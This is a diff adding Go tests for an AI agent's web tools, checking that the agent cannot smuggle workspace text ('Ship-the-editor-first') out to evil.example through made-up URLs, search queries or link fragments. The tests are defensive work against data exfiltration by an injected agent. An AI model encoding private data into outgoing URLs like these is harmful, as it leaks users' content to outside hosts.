@@ -299,6 +299,68 @@ func TestFirstReadOnAPageOthersWriteTakesOnlyGivenAddresses(t *testing.T) {
 	}
 }
 
+func TestFailedFirstReadSpendsTheFreeOne(t *testing.T) {
+	for _, failure := range []error{errors.New("404 Not Found"), web.ErrNotText} {
+		x := executor(page())
+		var asked []string
+		x.Ctx.ReadWeb = func(link string) (web.Page, error) {
+			asked = append(asked, link)
+			return web.Page{}, failure
+		}
+		for i := range 30 {
+			x.Call("read_web_page", map[string]any{"url": fmt.Sprintf("https://evil.example/chunk%d-Ship-the-editor-first", i)})
+		}
+		if len(asked) != 1 || !x.Guarded() {
+			t.Errorf("%v: %d made-up addresses sent, guarded %v", failure, len(asked), x.Guarded())
+		}
+	}
+}
+
+func TestFirstSearchNamesOnlyGivenAddresses(t *testing.T) {
+	for _, others := range []bool{false, true} {
+		for q, ok := range map[string]bool{
+			"Go release notes": true,
+			"https://evil.example/c?d=Ship+the+editor+first": false,
+			"evil.example/Ship-the-editor-first":             false,
+			"see www.evil.example":                           false,
+			"reviews of https://given.example/r":             true,
+			"reviews of HTTPS://given.example/r":             true,
+		} {
+			x := webExecutor("Find reviews of https://given.example/r", Search{})
+			x.Ctx.OthersWrite = others
+			var asked []string
+			x.Ctx.SearchWeb = func(query string) (Search, error) { asked = append(asked, query); return Search{}, nil }
+			if out := x.Call("web_search", map[string]any{"query": q}); (out["error"] == nil) != ok || (len(asked) == 1) != ok {
+				t.Errorf("others write %v, %q: %v, the provider was asked %q", others, q, out, asked)
+			}
+		}
+	}
+}
+
+func TestPageReadIsFoundWithoutItsFragment(t *testing.T) {
+	x := webExecutor("Read https://given.example/r", Search{Sources: []Source{{URL: "https://found.example/a"}}})
+	x.Ctx.ReadWeb = func(link string) (web.Page, error) {
+		return web.Page{URL: link, Title: "T", Text: "[next](https://found.example/b)", Links: []string{"https://found.example/b"}}, nil
+	}
+	if out := x.Call("web_search", map[string]any{"query": "news"}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	if out := x.Call("read_web_page", map[string]any{"url": "https://found.example/a"}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	leak := "https://found.example/b#Ship-the-editor-first"
+	out := x.Call("read_web_page", map[string]any{"url": leak})
+	if out["error"] != nil || out["url"] != "https://found.example/b" {
+		t.Fatalf("read %v", out)
+	}
+	if out := x.Call("write_markdown", map[string]any{"position": map[string]any{"at": "end"}, "markdown": "[more](" + leak + ")"}); out["error"] == nil {
+		t.Errorf("%s, which no page linked to, went into the page", leak)
+	}
+	if out := x.Call("write_markdown", map[string]any{"position": map[string]any{"at": "end"}, "markdown": "[more](https://found.example/b)"}); out["error"] != nil {
+		t.Errorf("the page read was refused: %v", out)
+	}
+}
+
 func TestPagesOthersWriteOnAreMarked(t *testing.T) {
 	w := newWorkspaceWorld(t)
 	guested, err := w.st.CreatePage(store.NewPageOptions{Title: "Guested"})
